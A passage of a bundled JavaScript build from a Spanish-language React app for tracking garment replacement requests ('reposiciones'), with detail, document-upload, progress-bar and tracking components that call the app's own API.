  ] });
}

// client/src/components/repositions/RepositionDetail.tsx
var import_sweetalert26 = __toESM(require_sweetalert2_all(), 1);
import { jsx as jsx56, jsxs as jsxs27 } from "react/jsx-runtime";
var statusColors = {
  pendiente: "bg-yellow-100 text-yellow-800",
  aprobado: "bg-green-100 text-green-800",
  rechazado: "bg-red-100 text-red-800",
  en_proceso: "bg-blue-100 text-blue-800",
  completado: "bg-gray-100 text-gray-800"
};
var urgencyColors = {
  urgente: "bg-red-100 text-red-800",
  intermedio: "bg-yellow-100 text-yellow-800",
  poco_urgente: "bg-green-100 text-green-800"
};
function RepositionDetail({
  repositionId,
  onClose
}) {
  const queryClient2 = useQueryClient();
  const [showUpload, setShowUpload] = useState34(false);
  const [showPrintSummary, setShowPrintSummary] = useState34(false);
  const [selectedFiles, setSelectedFiles] = useState34([]);
  const { data: reposition, isLoading } = useQuery({
    queryKey: ["reposition", repositionId],
    queryFn: async () => {
      const response = await fetch(`/api/repositions/${repositionId}`);
      if (!response.ok) throw new Error("Failed to fetch reposition");
      return response.json();
    }
  });
  const { data: pieces = [] } = useQuery({
    queryKey: ["reposition-pieces", repositionId],
    queryFn: async () => {
      const response = await fetch(`/api/repositions/${repositionId}/pieces`);
      if (!response.ok) return [];
      return response.json();
    }
  });
  const { data: history2 = [] } = useQuery({
    queryKey: ["reposition-history", repositionId],
    queryFn: async () => {
      const response = await fetch(`/api/repositions/${repositionId}/history`);
      if (!response.ok) return [];
      return response.json();
    }
  });
  const { data: documents = [] } = useQuery({
    queryKey: ["reposition-documents", repositionId],
    queryFn: async () => {
      const response = await fetch(`/api/repositions/${repositionId}/documents`, {
        headers: {
          "Authorization": `Bearer ${localStorage.getItem("token")}`
        }
      });
      if (!response.ok) return [];
      return response.json();
    }
  });
  const uploadDocumentsMutation = useMutation({
    mutationFn: async (files) => {
      const formData = new FormData();
      files.forEach((file) => {
        formData.append("documents", file);
      });
      const response = await fetch(`/api/repositions/${repositionId}/documents`, {
        method: "POST",
        body: formData
      });
      if (!response.ok) throw new Error("Failed to upload documents");
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["reposition-documents", repositionId] });
      setSelectedFiles([]);
      setShowUpload(false);
      import_sweetalert26.default.fire({
        title: "\xA1\xC9xito!",
        text: "Documentos subidos correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
    },
    onError: () => {
      import_sweetalert26.default.fire({
        title: "Error",
        text: "Error al subir documentos",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const handleUploadDocuments = () => {
    if (selectedFiles.length === 0) {
      import_sweetalert26.default.fire({
        title: "Error",
        text: "Selecciona al menos un archivo",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
      return;
    }
    uploadDocumentsMutation.mutate(selectedFiles);
  };
  const handleDownloadFile = async (filename) => {
    try {
      const response = await fetch(`/api/files/${filename}`, {
        method: "GET",
        headers: {
          "Authorization": `Bearer ${localStorage.getItem("token")}`
        }
      });
      if (!response.ok) {
        throw new Error("Error al descargar el archivo");
      }
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch (error) {
      console.error("Error downloading file:", error);
      import_sweetalert26.default.fire({
        title: "Error",
        text: "Error al descargar el archivo",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
    }
  };
  if (isLoading) {
    return /* @__PURE__ */ jsx56("div", { className: "fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50", children: /* @__PURE__ */ jsx56("div", { className: "bg-white rounded-lg p-8", children: /* @__PURE__ */ jsx56("div", { className: "text-center", children: "Cargando detalles..." }) }) });
  }
  if (!reposition) return null;
  return /* @__PURE__ */ jsxs27("div", { className: "fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4", children: [
    /* @__PURE__ */ jsx56("div", { className: "bg-white rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto", children: /* @__PURE__ */ jsxs27("div", { className: "p-6 space-y-6", children: [
      /* @__PURE__ */ jsxs27("div", { className: "flex justify-between items-start", children: [
        /* @__PURE__ */ jsxs27("div", { children: [
          /* @__PURE__ */ jsx56("h2", { className: "text-2xl font-bold text-purple-800", children: "Detalles de Solicitud" }),
          /* @__PURE__ */ jsx56("p", { className: "text-lg font-semibold text-gray-700 mt-1", children: reposition.folio })
        ] }),
        /* @__PURE__ */ jsxs27("div", { className: "flex items-center gap-4", children: [
          /* @__PURE__ */ jsxs27("div", { className: "flex gap-2", children: [
            /* @__PURE__ */ jsx56(Badge, { className: statusColors[reposition.status], children: reposition.status }),
            /* @__PURE__ */ jsx56(Badge, { className: urgencyColors[reposition.urgencia], children: reposition.urgencia }),
            /* @__PURE__ */ jsx56(Badge, { variant: "outline", children: reposition.type })
          ] }),
          /* @__PURE__ */ jsxs27("div", { className: "flex gap-2", children: [
            /* @__PURE__ */ jsxs27(
              Button,
              {
                onClick: () => setShowPrintSummary(true),
                className: "bg-blue-600 hover:bg-blue-700",
                children: [
                  /* @__PURE__ */ jsx56(Printer, { className: "w-4 h-4 mr-2" }),
                  "Resumen Ensamble"
                ]
              }
            ),
            /* @__PURE__ */ jsx56(Button, { variant: "outline", onClick: onClose, children: /* @__PURE__ */ jsx56(X, { className: "w-4 h-4" }) })
          ] })
        ] })
      ] }),
      /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsxs27(CardTitle, { className: "flex items-center gap-2", children: [
          /* @__PURE__ */ jsx56(User, { className: "w-5 h-5" }),
          "Informaci\xF3n del Solicitante"
        ] }) }),
        /* @__PURE__ */ jsxs27(CardContent, { className: "grid grid-cols-1 md:grid-cols-3 gap-4", children: [
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Nombre" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.solicitanteNombre })
          ] }),
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "\xC1rea" }),
            /* @__PURE__ */ jsx56("p", { className: "capitalize", children: reposition.solicitanteArea })
          ] }),
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Fecha de Solicitud" }),
            /* @__PURE__ */ jsx56("p", { children: new Date(reposition.fechaSolicitud).toLocaleDateString() })
          ] })
        ] })
      ] }),
      /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsxs27(CardTitle, { className: "flex items-center gap-2", children: [
          /* @__PURE__ */ jsx56(FileText, { className: "w-5 h-5" }),
          "N\xFAmero de Solicitud"
        ] }) }),
        /* @__PURE__ */ jsxs27(CardContent, { className: "grid grid-cols-1 md:grid-cols-3 gap-4", children: [
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "No. Solicitud de Pedido" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.noSolicitud })
          ] }),
          reposition.noHoja && /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "No. de Hoja" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.noHoja })
          ] }),
          reposition.fechaCorte && /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Fecha de Corte" }),
            /* @__PURE__ */ jsx56("p", { children: new Date(reposition.fechaCorte).toLocaleDateString() })
          ] })
        ] })
      ] }),
      /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsx56(CardTitle, { children: "Descripci\xF3n del Da\xF1o" }) }),
        /* @__PURE__ */ jsxs27(CardContent, { className: "space-y-4", children: [
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Causante del Da\xF1o" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.causanteDano })
          ] }),
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Descripci\xF3n del Suceso" }),
            /* @__PURE__ */ jsx56("p", { className: "whitespace-pre-wrap", children: reposition.descripcionSuceso })
          ] })
        ] })
      ] }),
      /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsxs27(CardTitle, { className: "flex items-center gap-2", children: [
          /* @__PURE__ */ jsx56(Package, { className: "w-5 h-5" }),
          "Informaci\xF3n del Producto"
        ] }) }),
        /* @__PURE__ */ jsxs27(CardContent, { className: "grid grid-cols-1 md:grid-cols-2 gap-4", children: [
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Modelo de la Prenda" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.modeloPrenda })
          ] }),
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Tela" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.tela })
          ] }),
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Color" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.color })
          ] }),
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Tipo de Pieza" }),
            /* @__PURE__ */ jsx56("p", { children: reposition.tipoPieza })
          ] }),
          reposition.consumoTela && /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Consumo de Tela:" }),
            /* @__PURE__ */ jsxs27("p", { children: [
              reposition.consumoTela,
              " metros"
            ] })
          ] }),
          reposition.consumoTela && /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Valor Estimado:" }),
            /* @__PURE__ */ jsxs27("p", { children: [
              "$",
              (reposition.consumoTela * 60).toFixed(2)
            ] })
          ] })
        ] })
      ] }),
      pieces.length > 0 && /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsx56(CardTitle, { children: "Piezas Solicitadas" }) }),
        /* @__PURE__ */ jsx56(CardContent, { children: /* @__PURE__ */ jsxs27(Table, { children: [
          /* @__PURE__ */ jsx56(TableHeader, { children: /* @__PURE__ */ jsxs27(TableRow, { children: [
            /* @__PURE__ */ jsx56(TableHead, { children: "Talla" }),
            /* @__PURE__ */ jsx56(TableHead, { children: "Cantidad" }),
            /* @__PURE__ */ jsx56(TableHead, { children: "No\xB0 Folio Original" })
          ] }) }),
          /* @__PURE__ */ jsx56(TableBody, { children: pieces.map((piece) => /* @__PURE__ */ jsxs27(TableRow, { children: [
            /* @__PURE__ */ jsx56(TableCell, { children: piece.talla }),
            /* @__PURE__ */ jsx56(TableCell, { children: piece.cantidad }),
            /* @__PURE__ */ jsx56(TableCell, { children: piece.folioOriginal || "-" })
          ] }, piece.id)) })
        ] }) })
      ] }),
      reposition.observaciones && /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsx56(CardTitle, { children: "Observaciones" }) }),
        /* @__PURE__ */ jsx56(CardContent, { children: /* @__PURE__ */ jsx56("p", { className: "whitespace-pre-wrap", children: reposition.observaciones }) })
      ] }),
      history2.length > 0 && /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsxs27(CardTitle, { className: "flex items-center gap-2", children: [
          /* @__PURE__ */ jsx56(Clock, { className: "w-5 h-5" }),
          "Historial de Movimientos"
        ] }) }),
        /* @__PURE__ */ jsx56(CardContent, { children: /* @__PURE__ */ jsx56("div", { className: "space-y-3", children: history2.map((entry) => /* @__PURE__ */ jsxs27("div", { className: "flex items-start gap-4 p-3 bg-gray-50 rounded-lg", children: [
          /* @__PURE__ */ jsx56("div", { className: "w-2 h-2 bg-purple-600 rounded-full mt-2" }),
          /* @__PURE__ */ jsxs27("div", { className: "flex-1", children: [
            /* @__PURE__ */ jsx56("p", { className: "font-medium", children: entry.description }),
            /* @__PURE__ */ jsx56("p", { className: "text-sm text-gray-600", children: new Date(entry.createdAt).toLocaleString() }),
            entry.fromArea && entry.toArea && /* @__PURE__ */ jsxs27("p", { className: "text-sm text-purple-600", children: [
              entry.fromArea,
              " \u2192 ",
              entry.toArea
            ] })
          ] })
        ] }, entry.id)) }) })
      ] }),
      /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsxs27(CardTitle, { className: "flex justify-between items-center", children: [
          /* @__PURE__ */ jsxs27("span", { className: "flex items-center gap-2", children: [
            /* @__PURE__ */ jsx56(FileText, { className: "w-5 h-5" }),
            "Documentos (",
            documents.length,
            ")"
          ] }),
          /* @__PURE__ */ jsxs27(
            Button,
            {
              onClick: () => setShowUpload(true),
              size: "sm",
              className: "bg-purple-600 hover:bg-purple-700",
              children: [
                /* @__PURE__ */ jsx56(Upload, { className: "w-4 h-4 mr-2" }),
                "A\xF1adir Documentos"
              ]
            }
          )
        ] }) }),
        /* @__PURE__ */ jsxs27(CardContent, { children: [
          documents.length > 0 ? /* @__PURE__ */ jsxs27(Table, { children: [
            /* @__PURE__ */ jsx56(TableHeader, { children: /* @__PURE__ */ jsxs27(TableRow, { children: [
              /* @__PURE__ */ jsx56(TableHead, { children: "Nombre del Archivo" }),
              /* @__PURE__ */ jsx56(TableHead, { children: "Tama\xF1o" }),
              /* @__PURE__ */ jsx56(TableHead, { children: "Subido por" }),
              /* @__PURE__ */ jsx56(TableHead, { children: "Fecha" }),
              /* @__PURE__ */ jsx56(TableHead, { children: "Acciones" })
            ] }) }),
            /* @__PURE__ */ jsx56(TableBody, { children: documents.map((doc) => /* @__PURE__ */ jsxs27(TableRow, { children: [
              /* @__PURE__ */ jsx56(TableCell, { children: doc.originalName }),
              /* @__PURE__ */ jsxs27(TableCell, { children: [
                (doc.size / 1024).toFixed(1),
                " KB"
              ] }),
              /* @__PURE__ */ jsx56(TableCell, { children: doc.uploaderName }),
              /* @__PURE__ */ jsx56(TableCell, { children: new Date(doc.createdAt).toLocaleDateString("es-ES") }),
              /* @__PURE__ */ jsx56(TableCell, { children: /* @__PURE__ */ jsx56(
                Button,
                {
                  size: "sm",
                  variant: "outline",
                  onClick: () => handleDownloadFile(doc.filename),
                  children: /* @__PURE__ */ jsx56(Download, { className: "w-4 h-4" })
                }
              ) })
            ] }, doc.id)) })
          ] }) : /* @__PURE__ */ jsx56("p", { className: "text-gray-500 text-center py-4", children: "No hay documentos adjuntos" }),
          showUpload && /* @__PURE__ */ jsx56("div", { className: "fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50", children: /* @__PURE__ */ jsxs27("div", { className: "bg-white rounded-lg p-6 max-w-md w-full mx-4", children: [
            /* @__PURE__ */ jsx56("h3", { className: "text-lg font-semibold mb-4", children: "A\xF1adir Documentos" }),
            /* @__PURE__ */ jsx56(
              FileUpload,
              {
                onFileSelect: setSelectedFiles,
                label: "Documentos adicionales",
                description: "Adjunta documentos relacionados con la reposici\xF3n",
                maxFiles: 5,
                maxSize: 10
              }
            ),
            /* @__PURE__ */ jsxs27("div", { className: "flex justify-end space-x-2 mt-4", children: [
              /* @__PURE__ */ jsx56(
                Button,
                {
                  variant: "outline",
                  onClick: () => {
                    setShowUpload(false);
                    setSelectedFiles([]);
                  },
                  children: "Cancelar"
                }
              ),
              /* @__PURE__ */ jsx56(
                Button,
                {
                  onClick: handleUploadDocuments,
                  disabled: uploadDocumentsMutation.isPending,
                  className: "bg-purple-600 hover:bg-purple-700",
                  children: uploadDocumentsMutation.isPending ? "Subiendo..." : "Subir"
                }
              )
            ] })
          ] }) })
        ] })
      ] }),
      /* @__PURE__ */ jsxs27(Card, { children: [
        /* @__PURE__ */ jsx56(CardHeader, { children: /* @__PURE__ */ jsx56(CardTitle, { children: "Estado Actual" }) }),
        /* @__PURE__ */ jsxs27(CardContent, { className: "grid grid-cols-1 md:grid-cols-2 gap-4", children: [
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "\xC1rea Actual" }),
            /* @__PURE__ */ jsx56("p", { className: "capitalize", children: reposition.currentArea })
          ] }),
          /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Fecha de Creaci\xF3n" }),
            /* @__PURE__ */ jsx56("p", { children: new Date(reposition.createdAt).toLocaleString("es-ES", {
              day: "2-digit",
              month: "2-digit",
              year: "numeric",
              hour: "2-digit",
              minute: "2-digit",
              timeZone: "America/Mexico_City"
            }) })
          ] }),
          reposition.approvedAt && /* @__PURE__ */ jsxs27("div", { children: [
            /* @__PURE__ */ jsx56("p", { className: "font-semibold text-gray-700", children: "Fecha de Aprobaci\xF3n" }),
            /* @__PURE__ */ jsx56("p", { children: new Date(reposition.approvedAt).toLocaleString("es-ES", {
              day: "2-digit",
              month: "2-digit",
              year: "numeric",
              hour: "2-digit",
              minute: "2-digit",
              timeZone: "America/Mexico_City"
            }) })
          ] })
        ] })
      ] }),
      /* @__PURE__ */ jsx56("div", { className: "flex justify-end", children: /* @__PURE__ */ jsx56(Button, { onClick: onClose, className: "bg-purple-600 hover:bg-purple-700", children: "Cerrar" }) })
    ] }) }),
    showPrintSummary && /* @__PURE__ */ jsx56(
      RepositionPrintSummary,
      {
        repositionId,
        onClose: () => setShowPrintSummary(false)
      }
    )
  ] });
}

// client/src/components/ui/progress.tsx
import * as React65 from "react";

// node_modules/@radix-ui/react-progress/dist/index.mjs
import * as React64 from "react";
import { jsx as jsx57 } from "react/jsx-runtime";
var PROGRESS_NAME = "Progress";
var DEFAULT_MAX = 100;
var [createProgressContext, createProgressScope] = createContextScope(PROGRESS_NAME);
var [ProgressProvider, useProgressContext] = createProgressContext(PROGRESS_NAME);
var Progress = React64.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeProgress,
      value: valueProp = null,
      max: maxProp,
      getValueLabel = defaultGetValueLabel,
      ...progressProps
    } = props;
    if ((maxProp || maxProp === 0) && !isValidMaxNumber(maxProp)) {
      console.error(getInvalidMaxError(`${maxProp}`, "Progress"));
    }
    const max3 = isValidMaxNumber(maxProp) ? maxProp : DEFAULT_MAX;
    if (valueProp !== null && !isValidValueNumber(valueProp, max3)) {
      console.error(getInvalidValueError(`${valueProp}`, "Progress"));
    }
    const value = isValidValueNumber(valueProp, max3) ? valueProp : null;
    const valueLabel = isNumber2(value) ? getValueLabel(value, max3) : void 0;
    return /* @__PURE__ */ jsx57(ProgressProvider, { scope: __scopeProgress, value, max: max3, children: /* @__PURE__ */ jsx57(
      Primitive.div,
      {
        "aria-valuemax": max3,
        "aria-valuemin": 0,
        "aria-valuenow": isNumber2(value) ? value : void 0,
        "aria-valuetext": valueLabel,
        role: "progressbar",
        "data-state": getProgressState(value, max3),
        "data-value": value ?? void 0,
        "data-max": max3,
        ...progressProps,
        ref: forwardedRef
      }
    ) });
  }
);
Progress.displayName = PROGRESS_NAME;
var INDICATOR_NAME3 = "ProgressIndicator";
var ProgressIndicator = React64.forwardRef(
  (props, forwardedRef) => {
    const { __scopeProgress, ...indicatorProps } = props;
    const context = useProgressContext(INDICATOR_NAME3, __scopeProgress);
    return /* @__PURE__ */ jsx57(
      Primitive.div,
      {
        "data-state": getProgressState(context.value, context.max),
        "data-value": context.value ?? void 0,
        "data-max": context.max,
        ...indicatorProps,
        ref: forwardedRef
      }
    );
  }
);
ProgressIndicator.displayName = INDICATOR_NAME3;
function defaultGetValueLabel(value, max3) {
  return `${Math.round(value / max3 * 100)}%`;
}
function getProgressState(value, maxValue) {
  return value == null ? "indeterminate" : value === maxValue ? "complete" : "loading";
}
function isNumber2(value) {
  return typeof value === "number";
}
function isValidMaxNumber(max3) {
  return isNumber2(max3) && !isNaN(max3) && max3 > 0;
}
function isValidValueNumber(value, max3) {
  return isNumber2(value) && !isNaN(value) && value <= max3 && value >= 0;
}
function getInvalidMaxError(propValue, componentName) {
  return `Invalid prop \`max\` of value \`${propValue}\` supplied to \`${componentName}\`. Only numbers greater than 0 are valid max values. Defaulting to \`${DEFAULT_MAX}\`.`;
}
function getInvalidValueError(propValue, componentName) {
  return `Invalid prop \`value\` of value \`${propValue}\` supplied to \`${componentName}\`. The \`value\` prop must be:
  - a positive number
  - less than the value passed to \`max\` (or ${DEFAULT_MAX} if no \`max\` prop is set)
  - \`null\` or \`undefined\` if the progress is indeterminate.

Defaulting to \`null\`.`;
}
var Root8 = Progress;
var Indicator2 = ProgressIndicator;

// client/src/components/ui/progress.tsx
import { jsx as jsx58 } from "react/jsx-runtime";
var Progress2 = React65.forwardRef(({ className, value, ...props }, ref) => /* @__PURE__ */ jsx58(
  Root8,
  {
    ref,
    className: cn(
      "relative h-4 w-full overflow-hidden rounded-full bg-secondary",
      className
    ),
    ...props,
    children: /* @__PURE__ */ jsx58(
      Indicator2,
      {
        className: "h-full w-full flex-1 bg-primary transition-all",
        style: { transform: `translateX(-${100 - (value || 0)}%)` }
      }
    )
  }
));
Progress2.displayName = Root8.displayName;

// client/src/components/repositions/RepositionTracker.tsx
import { jsx as jsx59, jsxs as jsxs28 } from "react/jsx-runtime";
function RepositionTracker({ repositionId, onClose }) {
  console.log("RepositionTracker mounted with repositionId:", repositionId);
  const { data: trackingData, isLoading, error } = useQuery({
    queryKey: ["repositions", repositionId, "tracking"],
    queryFn: async () => {
      console.log("Fetching tracking data for repositionId:", repositionId);
      const response = await fetch(`/api/repositions/${repositionId}/tracking`);
      console.log("Response status:", response.status);
      if (!response.ok) {
        const errorText = await response.text();
        console.error("API Error:", response.status, errorText);
        throw new Error(`Failed to fetch tracking data: ${response.status} - ${errorText}`);
      }
      const data = await response.json();
      console.log("Tracking data received:", data);
      return data;
    },
    retry: 1,
    enabled: !!repositionId
  });
  console.log("Query state:", { isLoading, error, trackingData });
  const getStepIcon = (status) => {
    switch (status) {
      case "completed":
        return /* @__PURE__ */ jsx59(CircleCheckBig, { className: "w-5 h-5 text-green-600" });
      case "current":
        return /* @__PURE__ */ jsx59(MapPin, { className: "w-5 h-5 text-blue-600" });
      case "pending":
        return /* @__PURE__ */ jsx59(Clock, { className: "w-5 h-5 text-gray-400" });
      default:
        return /* @__PURE__ */ jsx59(CircleAlert, { className: "w-5 h-5 text-yellow-600" });
    }
  };
  const getAreaDisplayName = (area) => {
    const names = {
      patronaje: "Patronaje",
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha",
      calidad: "Calidad",
      operaciones: "Operaciones",
      admin: "Administraci\xF3n"
    };
    return names[area] || area;
  };
  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString("es-ES", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });
  };
  if (isLoading) {
    console.log("Showing loading state");
    return /* @__PURE__ */ jsx59(Dialog2, { open: true, onOpenChange: onClose, children: /* @__PURE__ */ jsx59(DialogContent2, { className: "max-w-2xl", children: /* @__PURE__ */ jsxs28("div", { className: "text-center py-8", children: [
      /* @__PURE__ */ jsx59("div", { className: "animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4" }),
      /* @__PURE__ */ jsx59("p", { children: "Cargando seguimiento..." }),
      /* @__PURE__ */ jsxs28("p", { className: "text-sm text-gray-500 mt-1", children: [
        "Reposici\xF3n ID: ",
        repositionId
      ] })
    ] }) }) });
  }
  if (error) {
    console.log("Showing error state:", error);
    return /* @__PURE__ */ jsx59(Dialog2, { open: true, onOpenChange: onClose, children: /* @__PURE__ */ jsx59(DialogContent2, { className: "max-w-2xl", children: /* @__PURE__ */ jsxs28("div", { className: "text-center py-8", children: [
      /* @__PURE__ */ jsx59(CircleAlert, { className: "w-8 h-8 text-red-500 mx-auto mb-2" }),
      /* @__PURE__ */ jsx59("p", { children: "Error al cargar el seguimiento" }),
      /* @__PURE__ */ jsx59("p", { className: "text-sm text-gray-500 mt-1", children: error instanceof Error ? error.message : "Error desconocido" }),
      /* @__PURE__ */ jsxs28("p", { className: "text-xs text-gray-400 mt-2", children: [
        "Reposici\xF3n ID: ",
        repositionId
      ] })
    ] }) }) });
  }
  if (!trackingData) {
    console.log("No tracking data available");
    return /* @__PURE__ */ jsx59(Dialog2, { open: true, onOpenChange: onClose, children: /* @__PURE__ */ jsx59(DialogContent2, { className: "max-w-2xl", children: /* @__PURE__ */ jsxs28("div", { className: "text-center py-8", children: [
      /* @__PURE__ */ jsx59(CircleAlert, { className: "w-8 h-8 text-yellow-500 mx-auto mb-2" }),
      /* @__PURE__ */ jsx59("p", { children: "No se pudo cargar el seguimiento" }),
      /* @__PURE__ */ jsx59("p", { className: "text-sm text-gray-500 mt-1", children: "Los datos de seguimiento no est\xE1n disponibles" })
    ] }) }) });
  }
  if (!trackingData.reposition || !trackingData.steps || !trackingData.areaTimes) {
    console.log("Incomplete tracking data structure:", trackingData);
    return /* @__PURE__ */ jsx59(Dialog2, { open: true, onOpenChange: onClose, children: /* @__PURE__ */ jsx59(DialogContent2, { className: "max-w-2xl", children: /* @__PURE__ */ jsxs28("div", { className: "text-center py-8", children: [
      /* @__PURE__ */ jsx59(CircleAlert, { className: "w-8 h-8 text-yellow-500 mx-auto mb-2" }),
      /* @__PURE__ */ jsx59("p", { children: "Datos de seguimiento incompletos" }),
      /* @__PURE__ */ jsx59("p", { className: "text-sm text-gray-500 mt-1", children: "Faltan algunos datos necesarios para mostrar el seguimiento" })
    ] }) }) });
  }
  return /* @__PURE__ */ jsx59(Dialog2, { open: true, onOpenChange: onClose, children: /* @__PURE__ */ jsxs28(DialogContent2, { className: "max-w-4xl max-h-[90vh] overflow-y-auto", children: [
    /* @__PURE__ */ jsx59(DialogHeader, { children: /* @__PURE__ */ jsxs28(DialogTitle2, { className: "flex items-center gap-2", children: [
      /* @__PURE__ */ jsx59(MapPin, { className: "text-blue-600" }),
      "Seguimiento de Reposici\xF3n - ",
      trackingData.reposition.folio
    ] }) }),
    /* @__PURE__ */ jsxs28("div", { className: "space-y-6", children: [
      /* @__PURE__ */ jsxs28(Card, { children: [
        /* @__PURE__ */ jsx59(CardHeader, { children: /* @__PURE__ */ jsx59(CardTitle, { className: "text-lg", children: "Estado Actual" }) }),
        /* @__PURE__ */ jsx59(CardContent, { children: /* @__PURE__ */ jsxs28("div", { className: "space-y-4", children: [
          /* @__PURE__ */ jsxs28("div", { className: "flex justify-between items-center", children: [
            /* @__PURE__ */ jsx59("span", { className: "text-sm font-medium", children: "Progreso" }),
            /* @__PURE__ */ jsxs28(Badge, { variant: "outline", children: [
              trackingData.reposition.progress,
              "%"
            ] })
          ] }),
          /* @__PURE__ */ jsx59(Progress2, { value: trackingData.reposition.progress, className: "h-2" }),
          /* @__PURE__ */ jsxs28("div", { className: "flex justify-between items-center", children: [
            /* @__PURE__ */ jsx59("span", { className: "text-sm text-gray-600", children: "\xC1rea actual:" }),
            /* @__PURE__ */ jsx59(Badge, { children: getAreaDisplayName(trackingData.reposition.currentArea) })
          ] }),
          /* @__PURE__ */ jsxs28("div", { className: "flex justify-between items-center", children: [
            /* @__PURE__ */ jsx59("span", { className: "text-sm text-gray-600", children: "Estado:" }),
            /* @__PURE__ */ jsx59(Badge, { variant: trackingData.reposition.status === "completado" ? "default" : "secondary", children: trackingData.reposition.status })
          ] })
        ] }) })
      ] }),
      /* @__PURE__ */ jsxs28(Card, { children: [
        /* @__PURE__ */ jsx59(CardHeader, { children: /* @__PURE__ */ jsx59(CardTitle, { className: "text-lg", children: "Flujo de Proceso" }) }),
        /* @__PURE__ */ jsx59(CardContent, { children: /* @__PURE__ */ jsx59("div", { className: "space-y-4", children: trackingData.steps.map((step, index2) => /* @__PURE__ */ jsxs28("div", { className: "flex items-start gap-4", children: [
          /* @__PURE__ */ jsxs28("div", { className: "flex flex-col items-center", children: [
            getStepIcon(step.status),
            index2 < trackingData.steps.length - 1 && /* @__PURE__ */ jsx59("div", { className: `w-px h-12 mt-2 ${step.status === "completed" ? "bg-green-300" : "bg-gray-300"}` })
          ] }),
          /* @__PURE__ */ jsx59("div", { className: "flex-1 min-w-0", children: /* @__PURE__ */ jsxs28("div", { className: `p-4 rounded-lg border ${step.status === "current" ? "bg-blue-50 border-blue-200" : step.status === "completed" ? "bg-green-50 border-green-200" : "bg-gray-50 border-gray-200"}`, children: [
            /* @__PURE__ */ jsxs28("div", { className: "flex justify-between items-start", children: [
              /* @__PURE__ */ jsxs28("div", { children: [
                /* @__PURE__ */ jsx59("h4", { className: "font-medium", children: getAreaDisplayName(step.area) }),
                step.timestamp && /* @__PURE__ */ jsxs28("p", { className: "text-sm text-gray-600 mt-1", children: [
                  /* @__PURE__ */ jsx59(Clock, { className: "w-4 h-4 inline mr-1" }),
                  formatDate(step.timestamp)
                ] }),
                step.timeSpent && /* @__PURE__ */ jsxs28("p", { className: "text-sm text-blue-600 font-medium mt-1", children: [
